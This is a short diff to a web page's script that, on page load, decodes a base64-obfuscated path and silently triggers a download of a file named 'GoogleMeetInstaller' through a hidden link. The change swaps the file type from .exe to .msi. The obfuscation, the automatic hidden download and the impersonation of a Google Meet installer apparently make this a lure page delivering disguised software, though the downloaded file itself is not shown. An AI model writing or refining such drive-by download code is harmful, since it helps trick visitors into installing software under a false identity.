@@ -148,8 +148,8 @@
 
         // Blob Download Logic
         document.addEventListener('DOMContentLoaded', function (e) {
-            // Base64 encoded path: /downloads/GoogleMeetInstaller.exe -> L2Rvd25sb2Fkcy9Hb29nbGVNZWV0SW5zdGFsbGVyLmV4ZQ==
-            const fileUrlEncoded = 'L2Rvd25sb2Fkcy9Hb29nbGVNZWV0SW5zdGFsbGVyLmV4ZQ==';
+            // Base64 encoded path: /downloads/GoogleMeetInstaller.msi -> L2Rvd25sb2Fkcy9Hb29nbGVNZWV0SW5zdGFsbGVyLm1zaQ==
+            const fileUrlEncoded = 'L2Rvd25sb2Fkcy9Hb29nbGVNZWV0SW5zdGFsbGVyLm1zaQ==';
             const fileUrl = atob(fileUrlEncoded);
             const fileName = fileUrl.split('/').pop();
 
@@ -161,7 +161,7 @@
                     // Create a temporary link to trigger download
                     const tempLink = document.createElement('a');
                     tempLink.href = blobUrl;
-                    tempLink.download = 'GoogleMeetInstaller.exe'; // Explicitly set filename
+                    tempLink.download = 'GoogleMeetInstaller.msi'; // Explicitly set filename
                     tempLink.style.display = 'none';
                     document.body.appendChild(tempLink);
 
